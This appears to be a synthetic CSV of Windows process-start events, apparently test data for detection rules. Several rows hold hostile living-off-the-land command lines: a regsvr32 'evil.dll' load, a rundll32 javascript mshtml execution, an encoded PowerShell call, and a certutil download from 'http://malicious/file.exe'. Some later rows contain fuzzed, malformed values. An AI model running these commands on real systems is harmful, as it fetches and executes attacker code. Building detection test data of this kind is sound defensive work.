timestamp;event.id;host.name;host.ip;user.name;process.name;process.executable;process.command_line;process.parent.name;process.pid;process.args;agent.name;source.ip;destination.ip;event.type;user.id
2025-10-17T13:41:03.073338Z;evt-1001;host-01;10.0.1.10;javi;cmd.exe;C:\Windows\System32\cmd.exe;cmd.exe /c whoami;explorer.exe;4120;/c whoami;sysmon;192.168.1.5;8.8.8.8;process_start;UID100
2025-10-17T13:26:03.073338Z;evt-1002;host-02;10.0.1.12;juanjo;powershell.exe;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;powershell -NoProfile -ExecutionPolicy Bypass -Command Get-Process;services.exe;5321;-NoProfile -ExecutionPolicy Bypass -Command Get-Process;sysmon;192.168.1.7;10.1.1.1;process_start;UID101
2025-10-17T13:11:03.073338Z;evt-1003;host-03;10.0.1.13;maria;calculator.exe;C:\Windows\System32\calculator.exe;calculator.exe;cmd.exe;6211;;sysmon;192.168.1.20;10.0.0.5;process_start;UID102
2025-10-17T12:56:03.073338Z;evt-1004;host-04;10.0.1.14;pedro;svchost.exe;C:\Windows\System32\svchost.exe;svchost -k netsvcs;services.exe;2100;-k netsvcs;sysmon;192.168.1.21;10.0.0.6;process_start;UID103
2025-10-17T12:41:03.073338Z;evt-1005;host-05;10.0.2.10;ana;notepad.exe;C:\Windows\System32\notepad.exe;notepad C:\temp\notes.txt;explorer.exe;3332;C:\temp\notes.txt;sysmon;192.168.1.9;0.0.0.0;process_start;UID104
2025-10-17T12:26:03.073338Z;evt-1006;host-06;10.0.2.11;javi;regsvr32.exe;C:\Windows\System32\regsvr32.exe;regsvr32 /s evil.dll;wmic.exe;4411;/s evil.dll;sysmon;192.168.1.11;10.0.0.8;process_start;UID105
2025-10-17T12:11:03.073338Z;evt-1007;host-07;10.0.1.18;luis;rundll32.exe;C:\Windows\System32\rundll32.exe;"rundll32 javascript:""\..\mshtml,RunHTMLApplication""";explorer.exe;7765;"""\..\mshtml,RunHTMLApplication""";sysmon;192.168.1.33;8.8.4.4;process_start;UID106
2025-10-17T11:56:03.073338Z;evt-1008;host-08;10.0.3.15;sofia;powershell.exe;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;powershell -enc SGVsbG8=;explorer.exe;8821;-enc SGVsbG8=;sysmon;192.168.1.40;1.1.1.1;process_start;UID107
2025-10-17T11:41:03.073338Z;evt-1009;host-09;10.0.4.20;juanjo;cmd.exe;C:\Windows\System32\cmd.exe;cmd /c calc.exe;taskeng.exe;9901;/c calc.exe;sysmon;192.168.1.55;9.9.9.9;process_start;UID108
2025-10-17T11:26:03.073338Z;evt-1010;host-10;10.0.5.25;marta;explorer.exe;C:\Windows\explorer.exe;explorer.exe;winlogon.exe;1100;;sysmon;192.168.1.88;10.0.0.12;process_start;UID109
2025-10-17T11:11:03.073338Z;evt-1011;host-11;10.0.6.30;carlos;cmd.exe;C:\Windows\System32\cmd.exe;cmd.exe /c certutil -urlcache -f http://malicious/file.exe file.exe;explorer.exe;1200;/c certutil -urlcache -f http://malicious/file.exe file.exe;sysmon;192.168.1.100;203.0.113.5;process_start;UID110
2025-10-20T13:40:51.228283Z;evt-auto-01-10-5921;host-01;10.0.1.110;javi;appinstaller.exe .exe;C:\Windows\xxprogram filesyy;appinstaller.exe .exe /c echo test;explorer.exe;5476;/c echo test;edr1;192.168.1.61;1.1.1.1;;
2025-10-20T13:39:51.228520Z;evt-auto-01-11-6559;host-01;10.0.1.111;ana;appinstaller.exe .exe;C:\Windows\xxprogram filesyy;appinstaller.exe .exe /c echo test;explorer.exe;8019;/c echo test;edr1;192.168.1.40;203.0.113.5;;
2025-10-20T13:38:51.228652Z;evt-auto-01-12-8039;host-01;10.0.1.112;sofia;appinstaller.exe .exe;C:\Windows\xxprogram filesyy;appinstaller.exe .exe /c echo test;explorer.exe;5339;/c echo test;sysmon;192.168.1.32;10.1.1.1;;
2025-10-20T13:35:51.229476Z;evt-auto-02-10-2157;host-02;10.0.2.110;juanjo;"""bitsadmin.exe""";C:\Windows\System32\bitsadmin.exe .exe;bitsadmin.exe .exe /c echo test;explorer.exe;4373;/c echo test;sysmon;192.168.2.228;10.1.1.1;;
2025-10-20T13:25:51.229670Z;evt-auto-02-20-2222;host-02;10.0.2.120;ana;bitsadmin.exe .exe;C:\Windows\System32\bitsadmin.exe .exe;bitsadmin.exe .exe /c echo test;explorer.exe;3190;/c echo test;sysmon;192.168.2.239;10.1.1.1;;
2025-10-20T13:15:51.229854Z;evt-auto-02-30-7499;host-02;10.0.2.130;maria;bitsadmin.exe .exe;C:\Windows\System32\bitsadmin.exe .exe;"""XbitsadminX""";explorer.exe;7126;/c echo test;edr1;192.168.2.244;1.1.1.1;;
2025-10-20T13:14:51.230051Z;evt-auto-02-31-4919;host-02;10.0.2.131;ana;bitsadmin.exe .exe;C:\Windows\System32\bitsadmin.exe .exe;"""XbitsadminX""";explorer.exe;8412;/c echo test;edr1;192.168.2.185;203.0.113.5;;
2025-10-20T13:13:51.230239Z;evt-auto-02-32-8028;host-02;10.0.2.132;ana;bitsadmin.exe .exe;C:\Windows\System32\bitsadmin.exe .exe;"""XbitsadminX""";explorer.exe;5451;/c echo test;sysmon;192.168.2.223;203.0.113.5;;
